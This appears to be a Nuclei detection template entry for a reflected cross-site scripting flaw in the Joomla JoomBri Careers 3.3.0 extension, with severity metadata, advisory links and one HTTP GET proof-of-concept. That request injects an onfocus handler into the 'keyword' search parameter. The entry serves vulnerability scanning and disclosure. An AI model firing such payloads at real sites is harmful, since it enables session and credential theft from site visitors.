# Nuclei Template: Joomla JoomBri Careers 3.3.0 - Cross-Site Scripting
**Template ID:** joomla-joombri-careers-xss
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** Medium
**CWE:** CWE-79
**Source:** Nuclei Template (`joomla-joombri-careers-xss.yaml`)

## Vulnerability Information & PoC

## Description
The attacker can send to victim a link containing a malicious URL in an email or instant message can perform a wide variety of actions, such as stealing the victim's session token or login credentials.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/for-jobseekers/search-jobs?keyword=l9x1q%22onfocus%3D%22alert(document.domain)%22autofocus%3D%22ak5aghi5u9p
```

## References
- https://packetstormsecurity.com/files/168641/Joomla-JoomBri-Careers-3.3.0-Cross-Site-Scripting.html
- https://cxsecurity.com/issue/WLB-2022100024
- https://extensions.joomla.org/
